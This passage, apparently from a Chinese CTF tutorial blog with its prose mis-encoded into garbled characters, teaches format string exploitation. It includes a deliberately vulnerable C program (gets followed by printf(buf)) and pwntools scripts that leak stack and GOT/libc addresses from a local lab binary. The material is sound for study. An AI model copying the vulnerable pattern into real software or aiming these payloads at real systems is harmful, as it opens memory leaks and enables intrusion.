ä¸€å¦åˆ™æ ¹æ®ç›¸åº”çš„å­—ç¬¦ï¼Œè·å–ç›¸åº”çš„å‚æ•°ï¼Œå¯¹å…¶è¿›è¡Œè§£æå¹¶è¾“å‡º</li>
</ul>
<blockquote>
<p>åœ¨Linuxä¸­ï¼Œå­˜å–æ— æ•ˆçš„æŒ‡é’ˆä¼šå¼•èµ·è¿›ç¨‹æ”¶åˆ°<code>SIGSEGVä¿¡å·</code>ï¼Œä»è€Œä½¿ç¨‹åºéæ­£å¸¸ç»ˆæ­¢å¹¶äº§ç”Ÿæ ¸å¿ƒè½¬å‚¨ã€‚</p>
</blockquote>
<p>ç”¨äººè¯è¯´å°±æ˜¯ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å°±æ˜¯å°†è®¡ç®—æœºå†…å­˜ä¸­è¡¨ç¤ºçš„æ•°æ®è½¬åŒ–æˆæˆ‘ä»¬äººç±»å¯è¯»çš„å­—ç¬¦ä¸²æ ¼å¼ã€‚</p>
<h3 id="æ³„éœ²å†…å­˜æ¡ˆä¾‹">æ³„éœ²å†…å­˜ï¼ˆæ¡ˆä¾‹ï¼‰
</h3><p>ä¸€ä¸ªä¾‹å­ï¼Œåœ¨ä¸€ä¸ª32ä½ç¨‹åºçš„æ ˆä¸Šï¼š%x$på°†ä»¥16è¿›åˆ¶çš„æ–¹å¼è¾“å‡ºã€‚</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>0x8</th>
          <th>0x28</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0x10</td>
          <td>0xFFFF1234</td>
      </tr>
      <tr>
          <td>0x18</td>
          <td>0xFFFF1235</td>
      </tr>
      <tr>
          <td>0x20</td>
          <td>0xFFFF1236</td>
      </tr>
      <tr>
          <td>0x28</td>
          <td>%2$p%3$p</td>
      </tr>
      <tr>
          <td>0x30</td>
          <td></td>
      </tr>
      <tr>
          <td>0x38</td>
          <td></td>
      </tr>
      <tr>
          <td>0x40</td>
          <td></td>
      </tr>
  </tbody>
</table></div>
<p>åœ¨0x28ä¸Šæ³¨å…¥äº†%2$p%3$pï¼Œåˆ©ç”¨printfå°±ä¼šè¾“å‡º0xFFFF12350xFFFF1236</p>
<h3 id="æ³„éœ²æŒ‡å®šåœ°å€">æ³„éœ²æŒ‡å®šåœ°å€
</h3><h4 id="32ä½">32ä½
</h4><p>ä¸€èˆ¬æˆ‘ä»¬æ‰€è¯»å–çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²éƒ½æ˜¯åœ¨æ ˆä¸Šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨è°ƒç”¨è¾“å‡ºå‡½æ•°çš„æ—¶å€™ï¼Œå…¶å®ï¼Œç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼å…¶å®å°±æ˜¯è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ã€‚</p>
<p>ç”±äºæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨è¾“å‡ºå‡½æ•°è°ƒç”¨æ—¶æ˜¯ç¬¬å‡ ä¸ªå‚æ•°ï¼Œè¿™é‡Œå‡è®¾è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›¸å¯¹å‡½æ•°è°ƒç”¨ä¸ºç¬¬kä¸ªå‚æ•°ã€‚é‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„æ–¹å¼æ¥è·å–æŸä¸ªæŒ‡å®š
åœ°å€addrçš„å†…å®¹ï¼š<strong>addr%k$s</strong></p>
<p>åœ¨0x80102048åœ°å€ä¸­å­˜å‚¨ç€helloå­—ç¬¦ä¸²ï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th style="text-align: left">0x80102048</th>
          <th>hello</th>
      </tr>
  </thead>
  <tbody>
  </tbody>
</table></div>
<p>å¾€0x28æ³¨å…¥ %4$sï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>0x8</th>
          <th>0x28</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0x10</td>
          <td>0xFFFF1234</td>
      </tr>
      <tr>
          <td>0x18</td>
          <td>0xFFFF1235</td>
      </tr>
      <tr>
          <td>0x20</td>
          <td>0xFFFF1236</td>
      </tr>
      <tr>
          <td>0x28</td>
          <td>p32(0x80102048)</td>
      </tr>
      <tr>
          <td>0x30</td>
          <td>%4$s</td>
      </tr>
      <tr>
          <td>0x38</td>
          <td></td>
      </tr>
      <tr>
          <td>0x40</td>
          <td></td>
      </tr>
  </tbody>
</table></div>
<p>æ­¤æ—¶printfå°±ä¼šè¯»å–0x28ä¸Šçš„ç¬¬å››ä¸ªæ•°æ®çš„å­—ç¬¦ä¸²ï¼Œå› ä¸º0x80102048åœ°å€å­˜å‚¨çš„æ˜¯â€œhelloâ€å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆé¡ºå…¶è‡ªç„¶å°±è¾“å‡ºhelloäº†ã€‚</p>
<p>æ€»ç»“ä¸¤ç§æ–¹æ³•æ ¸å¿ƒåŒºåˆ«ï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>ç»´åº¦</th>
          <th>ç¬¬ä¸€ç§æ–¹æ³•ï¼ˆæ ˆä¸Šæ®‹ç•™åœ°å€ï¼‰</th>
          <th>ç¬¬äºŒç§æ–¹æ³•ï¼ˆgotè¡¨åœ°å€ï¼‰</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>è¯»å–å¯¹è±¡</td>
          <td>æ ˆä¸Šå·²å­˜åœ¨çš„æ•°æ®ï¼ˆæ®‹ç•™åœ°å€ï¼‰</td>
          <td>ä»»æ„æŒ‡å®šåœ°å€ï¼ˆgot è¡¨ï¼‰çš„æ•°æ®</td>
      </tr>
      <tr>
          <td>ä¾èµ–æ¡ä»¶</td>
          <td>æ ˆä¸Šæœ‰ libc ç›¸å…³åœ°å€æ®‹ç•™</td>
          <td>å·²çŸ¥ got è¡¨åœ°å€ï¼Œä¸”å‡½æ•°å·²åŠ¨æ€ç»‘å®š</td>
      </tr>
      <tr>
          <td>ç”¨é€”</td>
          <td>å¿«é€Ÿæ³„æ¼ libc åŸºåœ°å€ï¼ˆéœ€å·²çŸ¥ç‰ˆæœ¬ï¼‰</td>
          <td>æ³„æ¼åœ°å€ + åæŸ¥ libc ç‰ˆæœ¬</td>
      </tr>
      <tr>
          <td>æ“ä½œå¯¹è±¡</td>
          <td>åªéœ€è¦æ‰¾åç§»</td>
          <td>éœ€è¦æ‰¾gotåœ°å€+åç§»</td>
      </tr>
  </tbody>
</table></div>
<p>åœ¨æ¼æ´åˆ©ç”¨ä¸­ï¼Œä¸¤ç§æ–¹æ³•å¸¸ç»“åˆä½¿ç”¨ï¼šå…ˆç”¨ç¬¬äºŒç§æ–¹æ³•æ³„æ¼ got è¡¨åœ°å€ç¡®å®š libc ç‰ˆæœ¬ï¼Œå†ç”¨ç¬¬ä¸€ç§æ–¹æ³•å¿«é€Ÿè·å–å…¶ä»–å…³é”®åœ°å€ï¼Œæˆ–ç›´æ¥é€šè¿‡ got è¡¨åœ°å€æ„é€ åç»­æ”»å‡»ï¼ˆå¦‚ä¿®æ”¹ got è¡¨å®ç°å‡½æ•°åŠ«æŒï¼‰ã€‚</p>
<p>è®²å¾—å¾ˆæ¸…æ™°äº†â•®(â•¯ï¼¿â•°)â•­&hellip;&hellip;</p>
<p>é‚£ä¹ˆè¿™ä¸ªæ˜¯æ€ä¹ˆåº”ç”¨åœ¨æ¼æ´åˆ©ç”¨å½“ä¸­å‘¢ï¼Ÿæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸€èˆ¬éƒ½æ˜¯å’Œæ ˆæº¢å‡ºæ¼æ´è”åŠ¨çš„ï¼Œå¯ä»¥å½“åœºæ˜¯æ ˆæº¢å‡ºæ¼æ´åˆ©ç”¨ä¸­çš„ä¸€å°ç¯èŠ‚ï¼š</p>
<ol>
<li>æ³„æ¼æ ˆä¸Šæ®‹ç•™çš„Iibcåœ°å€ï¼šé€šè¿‡å…ˆç¡®å®šåç§»ï¼Œç„¶åä½¿ç”¨ç¬¬ä¸€ç§æ–¹æ³•è¾“å‡ºå³å¯ã€‚</li>
<li>æ³„æ¼gotè¡¨ä¸­çš„libcåœ°å€ï¼š
é€šè¿‡ç¬¬äºŒç§æ–¹æ³•è¾“å‡ºï¼Œåœ°å€æ³¨æ„å¡«ä¸ºä¸€ä¸ªå·²ç»è¿›è¡Œè¿‡ç»‘å®šçš„å‡½æ•°çš„gotåœ°å€ã€‚</li>
</ol>
<p>ä¼˜åŠ£å¯¹æ¯”ï¼š</p>
<ol>
<li>éœ€è¦å·²çŸ¥libcç‰ˆæœ¬ï¼Œå› ä¸ºä¸€èˆ¬æ— æ³•é€šè¿‡æ ˆä¸Šæ®‹ç•™çš„Iibcåœ°å€ç¡®å®šlibcç‰ˆæœ¬ï¼ˆè¿™ç§æ–¹æ³•ä¸éœ€è¦çŸ¥é“gotè¡¨åœ°å€ï¼‰ã€‚</li>
<li>éœ€è¦å·²çŸ¥gotè¡¨åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦å°†gotè¡¨åœ°å€å†™å…¥æ ˆä¸­ï¼ˆè¿™ç§æ–¹æ³•å¯ä»¥ç”¨äºæŸ¥è¯¢Iibcç‰ˆæœ¬ï¼‰ã€‚</li>
</ol>
<p>ç›´æ¥æ¥ä¸Šç¨‹åºæ¡ˆä¾‹æ¼”ç¤ºï¼ŒCæºä»£ç ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span> 
</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¨‹åºç¼–è¯‘ï¼ˆä¸ç”¨ç†ä¼šç¼–è¯‘è­¦å‘Šï¼‰ï¼š <a class="link" href="fmt_32" >fmt_32</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc fmt.c -o fmt_32 -g -no-pie -m32
</span></span></code></pre></td></tr></table>
</div>
</div><p>expï¼š</p>
<p><img src="/p/pwn-3/2.png"
	width="786"
	height="159"
	srcset="/p/pwn-3/2_hu_22120767d0a1bf45.png 480w, /p/pwn-3/2_hu_d5e180d9a95f32f2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="494"
		data-flex-basis="1186px"
	
></p>
<p>ç»™_printfçš„è°ƒç”¨åœ°å€æ–­ç‚¹è°ƒè¯•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fmt_32&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;b *0x80484F4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span><span class="c1">#b:break(æ–­ç‚¹)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/pwn-3/3.png"
	width="1918"
	height="879"
	srcset="/p/pwn-3/3_hu_f3c1157db7031af0.png 480w, /p/pwn-3/3_hu_4f37b98f783c1e16.png 1024w"
	loading="lazy"
	
		alt="gdbè°ƒè¯•ç•Œé¢"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="523px"
	
></p>
<h4 id="æ³„éœ²æ ˆä¸Šæ®‹ç•™çš„åœ°å€">æ³„éœ²æ ˆä¸Šæ®‹ç•™çš„åœ°å€
</h4><p>ç°åœ¨å…ˆå°è¯•ç¬¬ä¸€ç§æ–¹æ³•ï¼Œæ³„éœ²æ ˆä¸Šæ®‹ç•™çš„åœ°å€ï¼Œè¾“å…¥stack 30çœ‹æ ˆæƒ…å†µï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; stack 30
</span></span><span class="line"><span class="cl">00:0000â”‚ esp  0xff842d14 â—‚â€” 0x1000
</span></span><span class="line"><span class="cl">01:0004â”‚      0xff842d18 â€”â–¸ 0x8aea160 â—‚â€” &#39;AAAA\n&#39;
</span></span><span class="line"><span class="cl">02:0008â”‚      0xff842d1c â€”â–¸ 0xf7e1de67 (read+39) â—‚â€” cmp    eax, 0xfffff000 /* &#39;=&#39; */
</span></span><span class="line"><span class="cl">03:000câ”‚      0xff842d20 â€”â–¸ 0xf7d44474 â—‚â€” 0x2dfe
</span></span><span class="line"><span class="cl">04:0010â”‚      0xff842d24 â—‚â€” 0xffffffff
</span></span><span class="line"><span class="cl">05:0014â”‚      0xff842d28 â€”â–¸ 0xf7dab429 (_IO_doallocbuf+9) â—‚â€” add    ebx, 0x163bd7
</span></span><span class="line"><span class="cl">06:0018â”‚      0xff842d2c â€”â–¸ 0xf7f0f5c0 (_IO_2_1_stdin_) â—‚â€” 0xfbad2088
</span></span><span class="line"><span class="cl">07:001câ”‚      0xff842d30 â€”â–¸ 0xf7daaf07 (_IO_switch_to_get_mode+7) â—‚â€” add    edx, 0x1640f9
</span></span><span class="line"><span class="cl">08:0020â”‚      0xff842d34 â€”â–¸ 0xf7f0d880 (_IO_file_jumps) â—‚â€” 0x0
</span></span><span class="line"><span class="cl">09:0024â”‚      0xff842d38 â€”â–¸ 0xf7f0f5c0 (_IO_2_1_stdin_) â—‚â€” 0xfbad2088
</span></span><span class="line"><span class="cl">0a:0028â”‚      0xff842d3c â€”â–¸ 0xf7daa3f8 (_IO_file_underflow+328) â—‚â€” add    esp, 0x10
</span></span><span class="line"><span class="cl">0b:002câ”‚      0xff842d40 â—‚â€” 0x0
</span></span><span class="line"><span class="cl">0c:0030â”‚      0xff842d44 â€”â–¸ 0x8aea160 â—‚â€” &#39;AAAA\n&#39;
</span></span><span class="line"><span class="cl">0d:0034â”‚      0xff842d48 â—‚â€” 0x1000
</span></span><span class="line"><span class="cl">0e:0038â”‚      0xff842d4c â€”â–¸ 0xf7d44474 â—‚â€” 0x2dfe
</span></span><span class="line"><span class="cl">0f:003câ”‚      0xff842d50 â€”â–¸ 0xf7f42ec9 (_dl_lookup_symbol_x+9) â—‚â€” add    eax, 0x1d137
</span></span><span class="line"><span class="cl">10:0040â”‚      0xff842d54 â—‚â€” 0x7d4
</span></span><span class="line"><span class="cl">11:0044â”‚      0xff842d58 â€”â–¸ 0xf7f0d220 (_IO_helper_jumps) â—‚â€” 0x0
</span></span><span class="line"><span class="cl">12:0048â”‚      0xff842d5c â€”â–¸ 0x8048256 â—‚â€” je     0x80482cd /* &#39;gets&#39; */
</span></span><span class="line"><span class="cl">13:004câ”‚      0xff842d60 â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0xf7d9e500 (gets) â—‚â€” push   ebp
</span></span><span class="line"><span class="cl">14:0050â”‚      0xff842d64 â€”â–¸ 0xf7f47fc8 (_dl_fixup+184) â—‚â€” mov    edi, eax
</span></span><span class="line"><span class="cl">15:0054â”‚      0xff842d68 â€”â–¸ 0xf7daa2bb (_IO_file_underflow+11) â—‚â€” add    edi, 0x164d45
</span></span><span class="line"><span class="cl">16:0058â”‚      0xff842d6c â€”â–¸ 0xf7f0f5c0 (_IO_2_1_stdin_) â—‚â€” 0xfbad2088
</span></span><span class="line"><span class="cl">17:005câ”‚      0xff842d70 â€”â–¸ 0xf7f0d880 (_IO_file_jumps) â—‚â€” 0x0
</span></span><span class="line"><span class="cl">18:0060â”‚      0xff842d74 â€”â–¸ 0xf7f0f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1d7d8c
</span></span><span class="line"><span class="cl">19:0064â”‚ ebp  0xff842d78 â€”â–¸ 0xff842dd8 â€”â–¸ 0xff842e38 â—‚â€” 0x0
</span></span><span class="line"><span class="cl">1a:0068â”‚      0xff842d7c â€”â–¸ 0xf7dab51b (_IO_default_uflow+59) â—‚â€” add    esp, 0x10
</span></span><span class="line"><span class="cl">1b:006câ”‚      0xff842d80 â€”â–¸ 0xf7f0f5c0 (_IO_2_1_stdin_) â—‚â€” 0xfbad2088
</span></span><span class="line"><span class="cl">1c:0070â”‚      0xff842d84 â—‚â€” 0x0
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹æ ˆä¸Šæœ‰å¾ˆå¤šæ®‹ç•™åœ°å€ï¼Œæˆ‘ä»¬å°±é€‰ebpä¸‹æ–¹çš„ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">1a:0068â”‚      0xff842d7c â€”â–¸ 0xf7dab51b (_IO_default_uflow+59) â—‚â€” add    esp, 0x10
</span></span></code></pre></td></tr></table>
</div>
</div><p>å®ƒçš„æ ˆåœ°å€å°±æ˜¯ï¼š0xff842d7c</p>
<blockquote class="alert alert-warn">
    <blockquote>
<p>åœ¨gdbæ–­ç‚¹æ—¶ï¼Œæˆ‘ä»¬åº”è¦æ³¨æ„è¦æ–­ç‚¹åœ¨call printfçš„å‰é¢ä¸è¦è¶…è¿‡äº†å®ƒï¼Œå¦åˆ™printfå°±ä¸ä¼šç”Ÿæ•ˆäº†ã€‚</p>
</blockquote></blockquote>
<p>è¾“å…¥ï¼šfmtarg 0xff842d7c</p>
<p><img src="/p/pwn-3/4.png"
	width="1245"
	height="295"
	srcset="/p/pwn-3/4_hu_9fd8297fac69af12.png 480w, /p/pwn-3/4_hu_f7b878068d0b8d6e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="422"
		data-flex-basis="1012px"
	
></p>
<p>ç»“æœæ˜¯<code>%25$p</code></p>
<p>è¿™æ—¶å€™æˆ‘ä»¬æ”¹expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fmt_32&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;b *0x80484F4&#34;</span><span class="p">)</span><span class="c1">#b:break(æ–­ç‚¹)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%25$p&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œexpï¼Œè·³å‡ºgdbè°ƒè¯•ç•Œé¢åï¼Œç»™pwndbgè¾“å…¥cè¿è¡Œprintfæ‰“å°åœ°å€ï¼š</p>
<p><img src="/p/pwn-3/5.png"
	width="1918"
	height="879"
	srcset="/p/pwn-3/5_hu_224a6748b48c8ef9.png 480w, /p/pwn-3/5_hu_234097d6b52c55c2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="523px"
	
></p>
<p>å¯ä»¥å¤šè¯•å‡ æ¬¡ï¼Œåœ°å€æ˜¯éšæœºå˜åŒ–çš„ï¼Œä½†éƒ½æˆåŠŸæ³„éœ²å‡ºæ¥äº†ï¼Œåç»­å°±å¯ä»¥ç”¨u32å‡½æ•°æ‰“åŒ…èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡è¿›è¡Œå‚¨å­˜ã€‚</p>
<h4 id="æ³„éœ²ä»»æ„æŒ‡å®šåœ°å€got-è¡¨">æ³„éœ²ä»»æ„æŒ‡å®šåœ°å€ï¼ˆgot è¡¨ï¼‰
</h4><p>ç°åœ¨åˆ°ç¬¬äºŒç§æ–¹æ³•ï¼Œè¿™æ¬¡åŠ è½½äº†elfï¼Œå› ä¸ºéœ€è¦æ³„éœ²ç¨‹åºå†…<strong>ä»»æ„åœ°å€</strong></p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fmt_32&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;b *0x80484F4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span><span class="c1">#b:break(æ–­ç‚¹)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./fmt_32&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç°åœ¨éœ€è¦æ‰¾åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ï¼Œæ–¹æ³•å¾ˆå¤šï¼Œæ¥çœ‹ç¬¬ä¸€ç§ä¹Ÿæ˜¯æœ€ç®€å•çš„ï¼Œå…ˆè¿è¡Œgdb+pwndbgï¼Œè¾“å…¥cè¿è¡Œåˆ°printfåœ°å€æ–­ç‚¹å¤„ï¼š</p>
<p><img src="/p/pwn-3/6.png"
	width="1918"
	height="879"
	srcset="/p/pwn-3/6_hu_77be43da3ec64354.png 480w, /p/pwn-3/6_hu_9f854709c7eac29e.png 1024w"
	loading="lazy"
	
		alt="æ–­ç‚¹å¤„"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="523px"
	
></p>
<p>æ¥ç€ç”¨fmtargæ ¼å¼åŒ–å­—ç¬¦ä¸²ç´¢å¼•å‘½ä»¤ï¼Œå¾—åˆ°ç´¢å¼•åç§»ï¼š<strong>7 (&quot;%6$p&quot;)</strong></p>
<p><img src="/p/pwn-3/7.png"
	width="1918"
	height="454"
	srcset="/p/pwn-3/7_hu_3f1b13af2c90b8a2.png 480w, /p/pwn-3/7_hu_73aca8f84b686760.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="422"
		data-flex-basis="1013px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00:0000â”‚ esp  0xff912470 â€”â–¸ 0xff91248c â€”â–¸ 0x804a00c (_GLOBAL_OFFSET_TABLE_+12) â€”â–¸ 0x8048356 (printf@plt+6) â—‚â€” push   0 /* &#39;h&#39; */
</span></span></code></pre></td></tr></table>
</div>
</div><p>ï¼ˆ0xff91248cï¼‰åœ¨æ ˆä¸Šçš„å‚æ•°ä½ç½®æ˜¯ç¬¬ 7 ä¸ªã€‚</p>
<p>ğŸ˜„çœ‹å¾—æ‡µæ‡µçš„å§ï¼Ÿé¡ºä¾¿ç»™ä½ è§£é‡Šä¸‹gdbç•Œé¢å§ï¼š</p>
<blockquote class="alert alert-note">
    <blockquote>
<ol>
<li>ç¬¬ä¸€å±‚ï¼šæ ˆæŒ‡é’ˆ <strong>esp</strong> æŒ‡å‘çš„åœ°å€</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
